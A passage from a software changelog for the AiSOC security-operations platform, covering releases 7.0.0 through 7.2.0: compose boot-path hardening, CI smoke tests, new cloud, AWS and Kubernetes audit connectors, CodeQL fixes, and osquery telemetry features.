- **Connector count corrected to 50 across the repo.**
  - `apps/docs/docs/connectors/index.md`: catalog count updated and the
    23 missing connectors added across the existing categories
    (cloud / CNAPP / vuln-mgmt, SIEM, EDR/XDR, SaaS, ITSM, network,
    endpoint fleet, container orchestration).
  - `apps/docs/docs/connectors/api-coverage.md`: coverage-table heading
    updated.
  - `apps/web/src/components/onboarding/StartHero.tsx`: in-product copy
    on the onboarding tile updated.
  - `apps/docs/docs/intro.md`: two stale paragraphs updated.
  - Source of truth: `services/connectors/app/connectors/__init__.py`
    (`_CONNECTOR_CLASSES`).

Old historical entries in `AI_STACK_PLAN_PROGRESS.md` reference 42
connectors and are intentionally left as a snapshot of the v2.1 increment
they describe.

## [7.2.0] — 2026-05-11

### Changed — `docker compose up -d` is now pull-by-default

Track 1 + Track 2 of the docker-compose hardening work that began in
[7.1.1](#711--2026-05-10). 7.1.1 fixed the boot-path bugs that surfaced on
a clean clone; this release attacks the *time* dimension. The previous
behaviour — `docker compose up -d` on a fresh checkout building all 15
services from source — took 10–20 minutes on a typical laptop and was the
single largest source of "I tried AiSOC and gave up" reports. With this
release, the same command pulls 12 prebuilt images from GHCR and is
healthy in roughly 90 seconds.

No service code, no API surface, no database schema changed. Every change
in this release is in the boot path, the image-publish path, or the CI
gate that proves both still work.

#### Track 1 — Pull-by-default boot path

- **`docker-compose.yml`**: Every service that previously had a `build:`
  directive now also has an `image:` and `pull_policy: missing`. Compose
  will pull the prebuilt image from `ghcr.io/aisoc-platform/aisoc-<svc>`
  if it exists locally or in the registry; only if the pull fails does it
  fall back to building from source. The 12 backend services that publish
  images (api, agents, realtime, web, ingest, enrichment, fusion, actions,
  connectors, threatintel, ueba, slack-bot) are tagged via the
  `${AISOC_VERSION:-latest}` interpolation so the same compose file works
  for `latest`, `main`, a release tag (`v7.2.0`), or a local override.
  The three deferred services (osquery-tls, honeytokens, purple-team) are
  marked with a `# TODO(publish)` comment and continue to build locally.
- **`.env.example`**: Added a new top-of-file `AISOC_VERSION=latest`
  block that documents how to pin the entire backend to a release tag for
  reproducible deploys (`AISOC_VERSION=v7.2.0`), or track the bleeding
  edge (`AISOC_VERSION=main`).
- **`.github/workflows/publish-images.yml`**: Extended the build matrix
  from 4 services to 12 by adding ingest, enrichment, fusion, actions,
  connectors, threatintel, ueba, and slack-bot. These are the backend
  services that every full-stack `docker compose up -d` boots; without
  them in the publish matrix, `pull_policy: missing` would resolve to
  "build from source" for two-thirds of the stack and the change would be
  cosmetic.
- **`.github/workflows/release.yml`**: Mirrored the same 12-service
  matrix on tagged-release builds so that `AISOC_VERSION=v7.2.0` resolves
  to a real published image for every service in the compose file, not
  just the demo subset.

#### Track 2 — Build & CI hardening

The pull-by-default path only matters if the underlying images actually
build. Track 2 attacks the two largest historical sources of build-path
flakes — Poetry resolution failures during image build, and Dockerfile
regressions that nobody catches until release day.

- **All seven Python service Dockerfiles**
  (`services/{api,fusion,threatintel,slack-bot,actions,connectors,osquery-tls}/Dockerfile`):
  Added a `poetry install` → `pip install` fallback. The previous pattern
  failed the build on any transient PyPI hiccup, lock-file drift, or
  proxy timeout during `poetry install`. The new pattern wraps the
  install in `set -eux; if poetry install ...; then ...; else
  pip install <pinned list>; fi`, logs which path was taken, and pins
  every runtime dependency explicitly in the fallback list. The pinned
  list is documented as needing to track `pyproject.toml` and is
  exercised by the new nightly cold-cache CI run.
- **`.github/workflows/compose-smoke.yml`** (new): On every PR that
  touches `docker-compose.yml`, `docker-compose.demo.yml`, any service
  Dockerfile, `.env.example`, or the workflow itself, GitHub Actions now
  boots the full stack from a clean checkout and asserts `aisoc-postgres`
  is healthy, `api` returns 200 on `/health`, and `web` returns 200 on
  `/` — all within a 10-minute budget. Pull-by-default by design (so the
  CI run mirrors what the user sees), with automatic detection of
  Dockerfile changes that flips the workflow into rebuild-from-source
  mode so we don't smoke-test against a stale published image. Captures
  `docker compose ps`, `docker compose logs`, disk, and memory on
  failure.
- **`.github/workflows/compose-smoke-nightly.yml`** (new): At 09:00 UTC
  every day, GitHub Actions does a full cold-cache rebuild of every
  service (`docker compose build --no-cache --pull`) and re-runs the
  same smoke gates with a wider 20-minute budget. This is the gate that
  catches the regressions PR smoke physically cannot — upstream
  `python:3.11-slim` breakage, transitive dependency drift,
  `pyproject.toml` ↔ pip-fallback drift in the seven Python services.
  Failures upload a forensics artifact and open a `ci`-labelled tracking
  issue automatically so a nightly break is visible by standup.

### Changed

- **`apps/web/package.json`**: Bumped to `7.2.0`.

### Migration notes

None for users on 7.1.1. The compose file is backwards-compatible —
`pull_policy: missing` only changes behaviour the first time you boot
(it tries the registry before building); existing local images are
honoured. If you want the new fast path explicitly, run `docker compose
pull` once after upgrading. To pin a deploy to this release rather than
tracking `latest`, set `AISOC_VERSION=v7.2.0` in `.env`.

If you skipped 7.1.1, also read its [migration note](#711--2026-05-10)
about the `osquery-tls` host-port change (`8007` → `8091`).

## [7.1.1] — 2026-05-10

### Fixed — `docker compose up -d` first-touch experience

Hotfix in response to user-reported `docker compose up -d` failures on a clean
clone. None of these are functional changes to the running services — every
fix is in the boot path, the boot documentation, or the pre-flight check.

#### Compose hygiene

- **`docker-compose.yml`**: Removed the obsolete `version: '3.8'` declaration,
  which Docker Compose v2 ignores and warns about on every invocation
  (`level=warning msg="...the attribute version is obsolete..."`). The warning
  is harmless but is the very first line of output a new user sees, which
  signals "this project is broken" before the build even starts.
- **`docker-compose.yml`**: Added `mem_limit` + `mem_reservation` to the four
  data-tier containers most likely to OOM-kill on an under-provisioned Docker
  Desktop:
  - `kafka`: 1.5 GB limit / 1 GB reservation
  - `clickhouse`: 1 GB limit / 768 MB reservation
  - `opensearch`: 1 GB limit / 768 MB reservation
  - `neo4j`: 1 GB limit / 768 MB reservation

  Without these caps, a 4 GB Docker Desktop allocation (the default on macOS)
  would silently OOM-kill OpenSearch or Neo4j during JVM warmup, leaving the
  rest of the stack running but the alert/case feeds permanently empty.
- **`docker-compose.yml`** (`osquery-tls` service): Fixed `AISOC_INGEST_BASE_URL`
  pointing at the non-existent `ingest:8080` (the actual service is named
  `ingest-worker`). Also remapped the host port from `8007` to `8091` to
  resolve a host-port collision with the `ueba` service. Both bugs only
  surfaced if the user actually queried the osquery TLS server, which is why
  they survived the previous release; running `docker compose up -d` would
  succeed but `osquery-tls` would log connection-refused errors on every
  agent check-in.

#### README rewrite

- **`README.md`** — *Quick start*: Restructured so `pnpm aisoc:demo` is the
  canonical first-touch path (4 prebuilt images, ~90s to a working SOC
  console) and `docker compose up -d` is explicitly labelled the
  "developer-build path" (22 services, 10–20 min cold build, requires Docker
  with at least 6 GB RAM allocated). The previous structure presented both
  paths as equally valid, which led users with stock Docker Desktop settings
  straight into a stack that physically cannot fit in the daemon's memory.
- **`README.md`** — *Service map*: Updated `osquery-tls` from `:8090` to `:8091`
  and added a `Kafka UI` row at `:8090`, matching the compose hygiene fix
  above.
- **`README.md`** — *Boot section*: Added explicit timing expectations
  ("~5 GB of base image pulls + 10–20 min of build on a typical laptop"), a
  recommendation to run `pnpm aisoc:doctor` before kicking off the build, and
  a troubleshooting note pointing under-provisioned Docker Desktop installs
  at *Settings → Resources*.

#### `aisoc:doctor` hardening

The pre-flight check that the user is now told to run before
`docker compose up -d` was previously useless to first-time users — its
container check used `docker compose ps` (which is project-scoped and
therefore couldn't see containers launched by a sibling compose file), and
it had no opinion on whether Docker itself was provisioned to actually run
the stack. This release fixes both:

- **Docker Compose plugin enforcement**: New check that fails with an
  actionable error if the user only has Compose v1 (`docker-compose` Python
  binary) on PATH, which is now end-of-life and lacks healthcheck semantics
  the stack depends on.
- **Docker daemon RAM check**: Reads `docker info --format json` and asserts
  at least 6 GB allocated for the full stack (4 GB for the demo stack).
  Anything less hard-fails with a pointer to *Docker Desktop → Settings →
  Resources*. This single check would have prevented every variant of "the
  build succeeds but `docker compose ps` shows half my containers in a
  restart loop" reported to date.
- **Cross-compose-project container discovery**: Replaced `docker compose ps`
  with `docker ps -a --format json --filter name=aisoc-`. The doctor now
  detects whether the user is on the demo stack (`aisoc-demo-*` containers)
  or full stack (`aisoc-*` containers) and accepts either as a valid boot,
  so demo users no longer see false `FAIL` rows for services the demo
  intentionally omits (kafka-ui, neo4j, etc.).
- **Exit-code aware container reporting**: When a container exists but is
  not running, the doctor now emits the exact `Exited (255)` status from
  `docker ps` and tells the user `run \`docker logs <container>\``. The
  previous output ("not running") gave the user no signal about whether
  the container had crashed, never started, or been manually stopped.
- **Stack flavor summary**: A new `stack flavor` row reports `demo`,
  `full`, or `mixed`, plus a running/total container count
  (`(4/8 container(s) running)`) so the user can see at a glance whether
  they're looking at a half-broken stack or a fully-broken stack.

### Changed

- **`apps/web/package.json`**: Bumped to `7.1.1`.

### Migration notes

None. This is a docker-compose hygiene release — no service code,
no database schema, no API surface area changed. Pull, re-run
`pnpm aisoc:doctor`, and re-run `docker compose up -d` (the
`osquery-tls` port change means existing deployments need to update any
osquery-agent `tls_hostname:tls_port` config from `localhost:8007` to
`localhost:8091`, but no one was using that interface yet).

## [7.1.0] — 2026-05-10

### Added — Cloud Security Coverage Wave

Six new connectors, three documentation backfills, and one new ingest template.
Closes the biggest cloud-security gap in the connector catalogue: every Tier-1
cloud workload protection platform (Wiz, Prisma Cloud, Orca, Lacework, AWS
Security Hub) now has a first-class integration, AWS gets three native data
sources (GuardDuty, CloudTrail, VPC Flow Logs), and Kubernetes audit logs land
through a dual-mode connector that works on both managed and air-gapped
clusters.

#### Track A — Documentation backfill

- **`apps/docs/docs/connectors/wiz.md`**: Documented the Wiz GraphQL connector
  end-to-end — service-account creation, scope (`read:issues`,
  `read:vulnerabilities`), token rotation, normalised severity mapping, and a
  worked example of a Wiz `Issue` collapsing to `category=cloud_alert` in the
  inbox.
- **`apps/docs/docs/connectors/aws-security-hub.md`**: Documented IAM role vs.
  static-key auth, the `securityhub:GetFindings` permission model, and the
  `BLOCK_IP`/`ALLOW_IP` capabilities backed by
  `services/actions/app/clients/aws_security_groups.py` (i.e. how a SOC analyst
  can quarantine an attacker IP from the Security Hub finding without leaving
  the case workspace).
- **`apps/docs/docs/connectors/lacework.md`**: Documented the Lacework API
  token flow, `api_url` regional variants, and the alert→event severity map.
- **`apps/docs/sidebars.ts`**: Registered all three new docs pages under the
  `Connectors` category, plus the four new connector pages from Tracks B–D
  (`prisma-cloud`, `orca`, `aws-guardduty`, `aws-cloudtrail`, `aws-vpc-flow`,
  `kubernetes-audit`).

#### Track B — New CNAPP connectors

- **`services/connectors/app/connectors/prisma_cloud.py`** —
  `PrismaCloudConnector` with full Prisma Cloud (CSPM/CWPP) coverage. JWT auth
  via `POST /login`, paginated `GET /alert/v1/alert` with `time.from`/`time.to`
  windowing, severity collapse (`critical/high → high`, `medium → medium`,
  `low/informational → low`), and a `compute_url` override for self-hosted
  Compute Edition. Capability: `PULL_ALERTS`. Manifest: `plugins/prisma-cloud/plugin.yaml`,
  docs at `apps/docs/docs/connectors/prisma-cloud.md`, tests in
  `services/connectors/tests/test_prisma_cloud.py`.
- **`services/connectors/app/connectors/orca.py`** — `OrcaConnector` hitting
  `https://api.orcasecurity.io/api/alerts` with an `api_token` field, severity
  collapse (`critical/high/hazardous → high`, `medium → medium`,
  `informational/low → low`). Manifest, docs, and tests follow the same
  pattern. Capability: `PULL_ALERTS`.

#### Track C — Native AWS connectors

- **`services/connectors/app/connectors/aws_guardduty.py`** —
  `AWSGuardDutyConnector` mirroring `AWSSecurityHubConnector`'s shape:
  boto3-based, supports IAM-role or static-key auth, calls
  `guardduty.list_findings` + `get_findings` per detector. Normalises
  GuardDuty's continuous numeric severity scale (`0.1`–`10.0`) into AiSOC's
  four-tier `info|low|medium|high` ladder (`>= 7.0 → high`, `>= 4.0 → medium`,
  `>= 1.0 → low`, else `info`). Capability: `PULL_ALERTS`.
- **`services/connectors/app/connectors/aws_cloudtrail.py`** —
  `AWSCloudTrailConnector` using `cloudtrail.lookup_events`. Ships with a
  curated default allow-list of 21 high-signal event names covering identity
  abuse (`ConsoleLogin`, `AssumeRoleWithSAML`, `GetSessionToken`,
  `GetFederationToken`, `CreateAccessKey`, `CreateLoginProfile`,
  `CreateUser`), persistence (`AttachUserPolicy`, `PutUserPolicy`,
  `CreateRole`, `AttachRolePolicy`), data-plane abuse (`PutBucketPolicy`,
  `PutBucketAcl`, `DeleteBucketPolicy`, `PutObjectAcl`), network exposure
  (`AuthorizeSecurityGroupIngress`, `RevokeSecurityGroupIngress`,
  `ModifyDBInstance`), and trail tampering (`DeleteTrail`, `StopLogging`,
  `UpdateTrail`). Allow-list is overridable via the `event_names` config
  field. Pagination handled via `NextToken` with a hard cap to keep poll
  latency bounded. Capability: `PULL_LOGS`.
- **`services/connectors/app/connectors/aws_vpc_flow.py`** —
  `AWSVPCFlowLogsConnector` using `cloudwatch_logs.filter_log_events`. Parses
  both v2 (default 14-field) and v5 (header-defined) flow-log formats. Default
  `filter_pattern` is `?REJECT` to surface dropped traffic only — keeps volume
  manageable while flagging external-facing security groups that are getting
  scanned. Public-IP heuristic (`_is_public_ip`) is RFC-5735-aware, treating
  RFC1918/loopback/link-local/multicast/CGNAT/TEST-NET as private. Severity
  heuristic: public-IP REJECTs → `medium`, internal REJECTs → `low`,
  ACCEPT-only flows → `info`. Capability: `PULL_LOGS`.

#### Track D — Kubernetes audit logs (dual-mode)

- **`services/connectors/app/connectors/kubernetes_audit.py`** —
  `KubernetesAuditConnector` shipping with two delivery modes selected via the
  `mode` config field:
  - **`webhook` (recommended)** — Kubernetes API server pushes audit events
    to AiSOC's new dedicated `POST /v1/ingest/k8s-audit/{tenant_id}` route,
    authenticated with a shared secret in the `X-AiSOC-K8s-Token` header
    (compared in constant time so partial-prefix matches still fail). The
    legacy `/v1/inbox/{token}` path with the `k8s-audit` template is kept
    around as a fallback for control planes that cannot inject custom
    headers into the audit-webhook kubeconfig.
  - **`file_tail`** — AiSOC's connector pod tails a local `audit.log` file
    using a byte-position cursor (atomically written to a `.aisoc-cursor`
    sidecar), with rotation/truncation detection and a hard per-poll byte cap
    so a backlog can't blow up a single poll cycle.
- **`services/ingest/internal/handler/k8s_audit.go`** — New Go handler for
  the dedicated webhook route. Caps body size via `K8S_AUDIT_MAX_BODY_BYTES`
  (default 16 MiB), rejects oversized batches with `413` so the apiserver
  shrinks `--audit-webhook-batch-max-size` and retries, and publishes each
  `EventList.items[]` entry through the existing normalizer + Kafka publisher
  using `connector_type: kubernetes_audit`. The route is disabled (returns
  `503`) until an operator sets `K8S_AUDIT_SHARED_SECRET`, so a fresh
  install never accidentally accepts unauthenticated audit traffic.
- **`services/ingest/internal/normalizer/normalizer.go`** — Added the
  `kubernetes_audit` connector profile. Maps `auditID` to `external_id`,
  `verb` to `activity_name`, `user.username` to `actor.user.name`,
  `objectRef.{namespace,resource,name}` to a composite `target.resource.name`,
  and translates the connector's string severity (`critical|high|medium|low|
  info`) into OCSF integer severities (5/4/3/2/1).
- **`services/ingest/internal/normalizer/templates/k8s-audit.yaml`** — New
  inbox template (legacy path) that maps Kubernetes apiserver `Event`
  payloads (`apiVersion: audit.k8s.io/v1`) onto AiSOC's normalised event
  shape:
  - `external_id ← auditID`
  - `vendor ← "Kubernetes"`, `product ← "apiserver-audit"`,
    `category ← "k8s_audit"`
  - `actor ← user.username` (plus `user.groups` carried through metadata)
  - `target ← objectRef.namespace + "/" + objectRef.resource + "/" +
    objectRef.name`
  - `severity` is derived in the connector's `_classify_severity` heuristic,
    not in the template, so the same logic applies to both delivery modes.
- **Severity heuristic** (`_classify_severity` in `kubernetes_audit.py`):
  - `high` — `exec`/`attach`/`portforward` on a Pod, `create` on
    `ClusterRoleBinding`, `impersonate` verb, `update` on
    `serviceaccounts/token`, any `RequestResponse` event where
    `responseStatus.code >= 500` on a sensitive verb.
  - `medium` — `create`/`patch`/`delete` on `Secret`/`ConfigMap`/
    `ClusterRole`/`Role`, `escalate` verb, failed authentication
    (`responseStatus.code == 401|403`) on a write verb.
  - `low` — successful reads on sensitive resources (`get` on `Secret`),
    successful writes on routine resources.
  - `info` — everything else (health probes, list/watch on benign resources,
    successful low-impact reads).
- **`plugins/kubernetes-audit/plugin.yaml`** — Manifest with a 4-field config
  schema (`mode`, `cluster_name`, `inbox_token`, `audit_log_path`,
  `cursor_path`), `category: cloud`, capabilities `pull_audit` + `pull_alerts`.
- **`apps/docs/docs/connectors/kubernetes-audit.md`** — Includes a complete
  sample `AuditPolicy` (omitStages on RequestReceived for verbosity control;
  Metadata level for routine reads, RequestResponse for writes on Secret /
  ConfigMap / ClusterRoleBinding) and a sample `AuditSink` pointing at AiSOC's
  inbox URL.

#### Cross-cutting

- **`marketplace/index.json` + `apps/web/public/marketplace/index.json`** —
  Rebuilt via `pnpm marketplace:sync`. Plugin count rose from 43 → 49 (+6
  cloud connectors). Total marketplace entries: `total=7104 detections=6993
  playbooks=62 plugins=49 mitre_techniques=493`.
- **`apps/web/package.json`** — Version bumped from `7.0.3` to `7.1.0`; the
  sidebar and landing-page footer both surface the new version automatically.

#### Test footprint

- 43 unit tests for `KubernetesAuditConnector` covering both delivery modes,
  cursor persistence, rotation/truncation, byte-cap drain semantics, and the
  full severity-heuristic decision table.
- 27 unit tests for `AWSVPCFlowLogsConnector` covering v2/v5 parsing,
  public-IP classification edge cases (RFC1918, CGNAT, TEST-NET-1/2/3), and
  the default REJECT filter pattern.
- Mirroring tests for `PrismaCloudConnector`, `OrcaConnector`,
  `AWSGuardDutyConnector`, `AWSCloudTrailConnector` covering schema,
  normalise, pagination, and auth-error paths.
- Full `services/connectors` suite passes at 364 tests; schema-introspection
  tests in `services/api` also pass with the six new connectors added to
  `_CONNECTOR_CLASSES`.

---

## [7.0.3] — 2026-05-10

### Fixed — Hydration mismatch, font preload warnings

#### Web app (`apps/web/`)

- **`src/components/layout/AppShell.tsx`**: Wrapped `<DemoBanner />` in a new
  `<ClientOnly>` boundary so the banner (which reads `NEXT_PUBLIC_DEMO_MODE`)
  is never server-rendered. This eliminates React hydration error #418 caused by
  stale env-var inlining producing a structural tree mismatch (server saw
  `<button>` from Sidebar, client expected `<div>` from DemoBanner).
- **`src/app/layout.tsx`**: Added `preload: false` to the `JetBrains_Mono`
  `next/font/google` config. The monospace font is only used in code blocks and
  is not needed on the initial paint of most pages, causing Chrome to log
  "preloaded but not used within a few seconds" warnings. Lazy-loading the font
  eliminates these warnings without any visible FOUT.

---

## [7.0.2] — 2026-05-10

### Fixed — Version alignment, landing-page footer, documentation

- **`apps/web/package.json`**: Bumped `version` to `7.0.2`; sidebar now shows `v7.0.2` dynamically.
- **`apps/web/src/components/landing/Footer.tsx`**: Replaced hard-coded `v6.1.0` string with a
  dynamic import of `package.json` so the landing page footer always reflects the current package version.
- **`README.md`**: Updated version badge to `7.0.1`; added `osquery-tls` (port 8090) and
  `osquery-extensions` entries to the services table, the Swagger-UI URL table, and the
  directory tree; added osquery TLS server URL to the dev surface table.

---

## [7.0.1] — 2026-05-10

### Fixed — Web app hardening: CodeQL, hydration, Turbopack config

#### Security (CodeQL Code-Scanning — 42 alerts cleared)

- **Python**: Resolved `py/unused-global-variable` in `credential_vault.py`,
  `pack_loader.py`, `executive_digest.py`, `case_summary.py`,
  `cost_dashboard.py`, and `actions/executors/base.py` by refactoring mutable
  state into dictionaries and exposing identifiers via `__all__`.
- **Python**: Resolved `py/cyclic-import` between `osquery-tls` modules by
  extracting `generate_node_key` into a new `app/core/crypto.py` module.
- **Python**: Resolved `py/empty-except` in `api/main.py` and `api/services/github.py`
  by replacing bare `pass` blocks with `logger.debug` calls.
- **Python**: Resolved `py/log-injection` in `github.py`, `detection_proposals.py`,
  and `llm_credentials.py` by switching log format specifiers to `%r`.
- **Python**: Resolved `py/clear-text-logging-sensitive-data` in
  `workers/oauth_refresh.py` by redacting `tenant_id` and sanitising reason strings.
- **Python**: Resolved `py/incomplete-url-substring-sanitization` in
  `llm_resolver.py` by using `urllib.parse.urlparse` for hostname extraction.
- **Python**: Resolved `py/stack-trace-exposure` in `agents/api/explain.py` by
  returning a generic error string from the exception handler.
- **Python**: Resolved `py/call/wrong-arguments` in `agents/tests/smoke_explain.py`
  by importing and passing a `LlmConfig` instance to `_stream_explanation`.
- **Python**: Resolved `py/unused-import` in `osquery-tls/db/env.py`; fixed
  `E402` (import ordering) in the same file.
- **JavaScript**: Resolved `js/unused-local-variable` in `AlertsView.tsx`
  (removed unused `toast` import) and `SettingsView.byok.test.tsx` (removed
  unused `within` import).

#### Web app (`apps/web/`)

- **`next.config.js`**: Removed deprecated `eslint.ignoreDuringBuilds` key that
  Next.js 16 no longer accepts in the config file; added `turbopack.root` so
  Turbopack resolves workspace packages correctly.
- **`src/app/layout.tsx`**: Added `suppressHydrationWarning` to the `<html>`
  element so that the render-blocking `themeBootstrapScript` can freely write
  `data-theme`, `data-theme-preference`, and `style.colorScheme` on the client
  without React reporting a hydration mismatch on every page load.

---

## [7.0.x] — 2026-05-10 — Endpoint telemetry wave (PR1–PR6)

> **⚠️ Reconciliation notice (2026-05-12)**: The work described in this
> section was developed on branch `feat/pr6-osquery-extensions`
> (commits `e0d70fa1` → `3ab5aa81`) but the branch was **not merged into
> `main`** before this changelog entry was written. The files referenced
> below — including `services/osquery-tls/`,
> `services/connectors/app/connectors/aisoc_direct.py`,
> `services/agents/app/playbook/steps/osquery_live_query.py`, and the
> osquery-extensions Go module — exist on that branch and can be reviewed
> there, but are **not present on `main`** as of v7.1.0 planning. Treat
> this section as a record of in-flight work pending PR merge, not as
> shipped functionality. The community-feedback-driven roadmap
> (`docs/community-feedback/2026-05-12/`) builds the generic
> `live_action` interface (Issue #8) on `main` directly rather than
> assuming this section's primitives are in place.

### Added — osctrl, FleetDM, aisoc-osquery-tls, aisoc-direct, native osquery detections, live-query playbook step, FIM, custom virtual tables

Six-PR wave that closes [#44](https://github.com/beenuar/AiSOC/issues/44)
("osctrl connector for fleet-wide osquery telemetry") and significantly extends
osquery coverage end to end. Shipped in the v7.0 release window between the
v7.0.0 baseline and the v7.0.1 hardening patch.

#### PR1 — osctrl + FleetDM connectors

- **`services/connectors/app/connectors/osctrl.py`**, **`fleetdm.py`** — Two new
  `BaseConnector` subclasses with full `schema()`, `validate()`, `fetch_events()`,
  and `normalize()` implementations. Schema-driven setup runs a live
  `Test connection` round-trip before save; secrets encrypted with the
  application-layer `CredentialVault` (Fernet AES-128-CBC + HMAC-SHA256);
  polling on per-instance schedule via `ConnectorScheduler`.
- **`plugins/osctrl/plugin.yaml`**, **`plugins/fleetdm/plugin.yaml`** — Marketplace
  manifests mirroring the connector schemas. `marketplace/index.json` regenerated
  via `pnpm marketplace:sync`.
- **`services/connectors/tests/test_osquery_connectors.py`** — Schema contract +
  severity heuristics tests.

#### PR2 — Native osquery detection schema migration

- **`detections/endpoint/osquery-*.yaml`** — 16 osquery detection rules
  migrated from `_quarantine/` to the native schema, IDs `det-endpoint-281`
  through `det-endpoint-296`. Coverage spans credential access, persistence,
  lateral movement, defense evasion, and discovery on macOS, Linux (auditd),
  and Windows.
- **`detections/fixtures/osquery_*.json`** — Positive / negative test
  fixtures for every migrated rule, gated by the Detection Validation
  workflow in CI.

#### PR3 — Live-query playbook step

- **`services/actions/app/clients/osctrl_client.py`**,
  **`fleetdm_client.py`**, **`aisoc_direct_client.py`** — Production-grade
  HTTP clients with per-vendor auth, retries, and structured error handling.
- **`services/actions/app/clients/osquery_allowlist.py`** — Strict allowlist
  enforcing only safe SELECT-only queries against approved tables (no
  `ATTACH`, no `INSERT`, no `pragma_*` introspection of secrets).
- **`services/agents/app/playbook/engine.py::_handle_osquery_live_query`** —
  New `osquery_live_query` step type, registered in
  `services/agents/app/playbook/models.py` as `StepType.OSQUERY_LIVE_QUERY` and
  dispatched from the `STEP_HANDLERS` table at the bottom of `engine.py`.
  Pushes allowlisted distributed queries to a single host or fleet-wide via
  osctrl / FleetDM / aisoc-direct with HMAC-signed ChatOps approval before
  execution. Tests live in
  `services/agents/tests/test_osquery_live_query_step.py`.

  > **v7.0.x reconciliation:** Earlier drafts of this CHANGELOG referenced a
  > separate module at `services/agents/app/playbook/steps/osquery_live_query.py`.
  > That module never landed on `main` — the handler is inlined in `engine.py`
  > to keep the playbook engine's dispatch table in one place. The behaviour,
  > tests, and CLI surface are identical to the originally documented design.

#### PR4 — `aisoc-osquery-tls` FastAPI service + `aisoc-direct` connector

- **`services/osquery-tls/`** — New first-party FastAPI service exposing
  `/api/v1/enroll`, `/api/v1/config`, `/api/v1/log`, `/api/v1/distributed/read`,
  `/api/v1/distributed/write`, plus `/api/v1/fim` for file-integrity events.
  Self-hosted osquery TLS plugin endpoints are FleetDM-compatible so any
  off-the-shelf osquery agent can enroll without a third-party SaaS hop.
  Uses dedicated SQLite + Alembic migrations under `services/osquery-tls/db/`.
- **`services/osquery-tls/app/api/v1/endpoints/log.py`** + matching
  `plugins/aisoc-direct/plugin.yaml` and
  `services/actions/app/clients/aisoc_direct_client.py` — Direct-from-agent
  ingest path that consumes the osquery-tls log stream and normalises into
  the standard alert schema; bypasses third-party SaaS entirely. The
  `aisoc-direct` connector is implemented as a **virtual connector**: agents
  push events directly into `/api/v1/log` on the osquery-tls service, which
  fans them out to the same ingest pipeline the polled connectors use. The
  marketplace manifest lives at `plugins/aisoc-direct/plugin.yaml`; the
  outbound client (used by playbooks to drive distributed queries) lives at
  `services/actions/app/clients/aisoc_direct_client.py`.

  > **v7.0.x reconciliation:** Earlier drafts of this CHANGELOG referenced a
  > polled connector module at
  > `services/connectors/app/connectors/aisoc_direct.py`. That module never
  > landed on `main`. The connector is implemented as a push-based virtual
  > connector (the `osquery-tls` service is itself the ingest endpoint), so
  > there is nothing to register in `services/connectors/app/connectors/__init__.py`.
  > Functionally the data path is identical to the originally documented
  > design.

#### PR5 — Osquery packs + FIM endpoint + FIM dashboard

- **`services/osquery-tls/app/osquery_packs/`** — Bundled IR / OSquery-ATT&CK /
  FIM packs distributed to every enrolled agent on enrollment. Pack loader
  preserves hand-crafted playbooks under `pack root` (do not `rmtree`).
- **`services/osquery-tls/app/api/v1/endpoints/fim.py`** — File-integrity
  monitoring endpoint. Ingests `file_events` and synthesises alerts on writes
  to `/etc/passwd`, `/etc/shadow`, sshd configs, sudoers, and Windows
  registry hives. FIM-specific detection IDs `det-endpoint-297..300`
  (renumbered from 281–284 to avoid collision with osquery-macos rules).
- **`apps/web/src/components/dashboard/FimDashboard.tsx`** — New dashboard
  panel grouping FIM events by host, file, and severity.

#### PR6 — AiSOC osquery extensions (custom virtual tables)

- **`services/osquery-extensions/tables/`** — 5 custom Go-based virtual tables
  shipping with the agent for richer endpoint visibility plus a bidirectional
  response channel:
  - `aisoc_browser_extensions` — installed browser extensions across Chrome,
    Firefox, Edge, Safari profiles.
  - `aisoc_kernel_modules` — currently loaded kernel modules with signing /
    tainting state.
  - `aisoc_attck_persistence` — MITRE ATT&CK persistence locations
    (LaunchAgents, scheduled tasks, systemd units, Run keys).
  - `aisoc_pending_actions` — pending response actions queued for the agent;
    enables host → server → host bidirectional flow.
  - `aisoc_alert_cache` — local cache of alerts the agent has emitted, for
    deduplication and replay.
- **`services/osquery-extensions/tables/pending_actions_test.go`** — Unit
  tests for the bidirectional action queue.
- **`docs/openapi.yaml`** regenerated to include the extensions API endpoints.

#### Cross-cutting CI / housekeeping

- **CI**: Detection Validation workflow now covers the 16 migrated osquery
  rules; Python Tests, Web Build, and the osquery-tls service build are all
  green.
- **Lint**: `ruff format` and `ruff check --fix` applied across the new
  `osquery-tls` service; F401 / UP017 / UP037 / I001 / W291 cleared.
- **Marketplace**: `apps/web/public/marketplace/curated.json` re-synced from
  `marketplace/` after the new connector / plugin manifests landed.

---

## [7.0.0] — 2026-05-10

### Added — v1.0 Buyer-Value Plan: ChatOps, Digest PDF, BYOK, Air-gap, WCAG AA, Analytics

This release ships the complete v1.0 buyer-value plan across 16 workstreams.
All items were designed, implemented, tested, and reviewed by
Beenu Arora <beenu@cyble.com>.

#### WS-A1 — Slack ChatOps Bot (`services/slack-bot/`)

- **`services/slack-bot/`** — New standalone FastAPI service using `slack-bolt`
  async adapter. Ships `/aisoc triage <case_id>`, `/aisoc approve <action_id>`,
  `/aisoc status <case_id>`, and `/aisoc summary <case_id>` slash commands.
  Interactive approval buttons route back through the API approval endpoint so
  human-in-the-loop gates work from Slack without opening the console.
- 61 pytest cases cover the slash-command handlers, interactive payloads, API
  client calls, and error paths (bad token, non-200 API response, missing case).

#### WS-B1/B2 — Executive Digest PDF + Weekly Scheduler

- **`services/api/app/services/digest_pdf.py`** — Generates a branded A4 PDF
  for `ExecutiveDigest` objects using ReportLab. Includes cover page, KPI tiles,
  alert-volume chart, top-rule table, top-actor table, and remediation summary.
- **`services/api/app/workers/weekly_digest_task.py`** — APScheduler task that
  runs every Monday at 06:00 UTC, builds a digest for every active tenant, and
  delivers it via `POST /api/v1/reports/digest/email` or writes it to blob
  storage. Controlled by `DIGEST_SCHEDULE_ENABLED` env flag.
- **`services/api/app/services/digest_html.py`** — HTML mirror of the PDF for
  in-browser preview.
- **`services/api/tests/test_digest_pdf.py`** — 12 pytest cases covering PDF
  generation, chart rendering, and weekly scheduler triggering.

#### WS-C1/C2/C3 — Playbook Gallery, Detection Proposals, GitHub PR Integration

- **`apps/web/src/components/playbooks/PlaybooksGallery.tsx`** — Tabbed gallery
  with 12 curated packs (Phishing, Ransomware, BEC, IAM Key Compromise, …).
  Each card shows TTP coverage badges, author, version, and a one-click
  **Import** button that calls `POST /api/v1/playbooks/import`.
- **`services/api/migrations/039_detection_proposal_github_pr.sql`** —
  Adds `github_pr_url TEXT` and `github_pr_number INT` to `detection_proposals`.
- **`services/api/app/services/github.py`** — `GitHubService` creates draft PRs
